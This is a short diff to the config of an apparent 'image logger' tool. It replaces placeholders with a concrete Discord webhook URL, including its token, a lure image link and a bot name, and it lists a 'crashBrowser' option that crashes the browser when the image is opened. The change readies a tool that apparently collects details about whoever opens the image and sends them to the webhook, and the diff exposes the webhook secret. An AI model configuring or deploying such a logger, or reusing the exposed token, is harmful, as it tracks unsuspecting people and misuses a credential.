@@ -13,11 +13,11 @@ __version__ = "v3.0"
 __author__ = "gdfdffffgccvvvvvv"
 
 config = {
-    "webhook": "Your Webhook Here", # Replace with your actual webhook URL.
-    "image": "your image here", #it have to be a link finish with .png or .jpg 
+    "webhook": "https://discord.com/api/webhooks/1551215993378836552/5riU5hSk78h7qaji2OVKEDZ4fesMUUGkXPJZICeUGqKgBZXASz7Q6c2w-WGihaDhr8E9", # Replace with your actual webhook URL.
+    "image": "https://i.pinimg.com/736x/6f/e7/42/6fe742469cc9d01a6614f06f1777c415.jpg", #it have to be a link finish with .png or .jpg 
     "imageArgument": True,
 
-    "username": "Botusername", #Username of the bot that will send the message to your webhook.
+    "username": "Berliner Bär", #Username of the bot that will send the message to your webhook.
     "color": 0x00FFFF,
 
     "crashBrowser": False, #Make the browser crash when the image is opened, this is not recommended and may not work.
